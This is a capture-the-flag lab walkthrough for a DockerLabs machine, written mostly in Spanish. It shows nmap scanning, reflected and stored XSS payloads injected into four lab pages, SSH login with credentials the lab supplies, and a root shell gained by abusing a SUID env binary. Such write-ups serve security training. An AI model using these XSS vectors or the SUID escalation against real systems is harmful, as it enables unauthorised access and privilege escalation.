![image](https://github.com/user-attachments/assets/7667d42f-6066-4428-9caf-3ff0c04b0dbb)

```bash
ping -c 1 172.17.0.2
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
nmap -sCV -p21,22,80 172.17.0.2 -oN targeted
```
![image](https://github.com/user-attachments/assets/899fca64-713d-4481-b02a-fb7deb91a1db)

## **Open Ports**

-PORT 80: Service HTTP

-PORT 22: Service SSH

## **let's launch a command to scan the WEB and report the technologies it uses**
```bash
whatweb http://172.17.0.2 | tee whatweb
```
![image](https://github.com/user-attachments/assets/fe6800b7-0f88-4629-b05a-4f12fc3de42e)

FASE INTRUSIÓN Y PRUEBAS EN ESTE CASO
Vemos 4 laboratorios:

-Laboratorio1 (reflected XSS) Nos dirigimos a el e inyectamos este comando:

<h1>Hola caraculo</h1>
o este otro

'"><img src=x onerror=alert(1) />
-Laboratorio2 (stored XSS) Nos dirigimos y ejecutamos:

<h1>XSS</h1>
<p style="color:blue;">COLOR_AZUL</p>
'"><img src=x onerror=alert(1) />
<h1>Hola caraculo</h1>
-laboratorio3 (XSS con Dropdowns) cacharreando dando a las opciones en la barra de navegador podemos ver esto:

http://172.17.0.2/laboratorio3/?opcion1=ValorA&opcion2=&opcion3=
aqui vamos a inyectar el XSS:

http://172.17.0.2/laboratorio3/?opcion1=ValorA&opcion2=&opcion3=<h1>HOLA</h1>
http://172.17.0.2/laboratorio3/?opcion1=ValorA&opcion2=&opcion3=<img src="x" onerror="alert(1)" />
-laboratorio4 (Reflected XSS a traves de la URL) podemos leer esto :

No hay contenido en el parámetro 'data'.
lo cual nos hace pensar que se puede inyectar cosas en el parametro dara, así que lo insertamos en la url: URL original :

http://172.17.0.2/laboratorio4/
url con el parametro data:

http://172.17.0.2/laboratorio4/?data=<h1>Hola</h1>
http://172.17.0.2/laboratorio4/?data=<img src="x" onerror="alert(1)" />
LAS INYECCIONES PUEDEN OBTENERSE DESDE VARIOS SITIOS, YO RECOMIENDO
https://book.hacktricks.wiki/en/index.html
en el buscador poneis XSS y os aparece mucha información También:

https://swisskyrepo.github.io/PayloadsAllTheThings
en el buscador XSS y lo mismo

FASE INTRUSIÓN PARTE 2
ahora por fin podemos darle al botón:

Click aquí cuando Hayas Completado los Laboratorios
y nos aparece esto:

Accede por SSH con estas credenciales SOLO cuando hayas completado los retos anteriores.
En caso contrario, el Writeup que subas a DockerLabs.es no se tendrá en cuenta.

Usuario: balu
Password: balulero
el user y pass para el ssh, así pues nos conectamos con ssh:

ssh balu@172.17.0.2
suelo ir en este orden:

1-listar grupos a los que pertenezco:

id
uid=1000(balu) gid=1000(balu) groups=1000(balu),100(users)
nada fuera de lo normal

2-mirar variable de entorno:

printenv
nada interesante

3- cat al /etc/passwd para saber usuarios del sistema

cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
balu:x:1000:1000:balu,,,:/home/balu:/bin/bash
balulito:x:1001:1001:balulito,,,:/home/balulito:/bin/bash
aparte del user balu que es el que somos tenemos balulito y root, esto puede suponer que hay que pivotar a otro usuario y luego a root

4- privilegios con sudo -l

sudo -l
nada

5- mirar suid y capability

aquí con el suid me valió

find / -perm -4000 2>/dev/null
/usr/bin/chfn
/usr/bin/env
/usr/bin/passwd
/usr/bin/su
/usr/bin/mount
/usr/bin/umount
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/sudo
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
tenemos por ahí /usr/bin/env que no suele estar, vamos a la página:

https://gtfobins.github.io/
el el buscador introducimos

env
y de este binario podemos consultar /Shell/SUID/Sudo

como vimos tiene privilegios suid, podemos comprobarlo así:

ls -la /usr/bin/env
-rwsr-xr-x 1 root root 48536 Sep 20  2022 /usr/bin/env
ahí podemos ver la s de suid

en gtfobin nos dice esto en la parte SUI:

./env /bin/sh -p
entonces lo adaptamos a nuestras necesidades:

/usr/bin/env /bin/bash -p
lo ejecutamos y:

balu@6858f5cbddcc:~$ /usr/bin/env /bin/bash -p
bash-5.2# id
uid=1000(balu) gid=1000(balu) euid=0(root) groups=1000(balu),100(users)
bash-5.2# whoami
root
bash-5.2# 
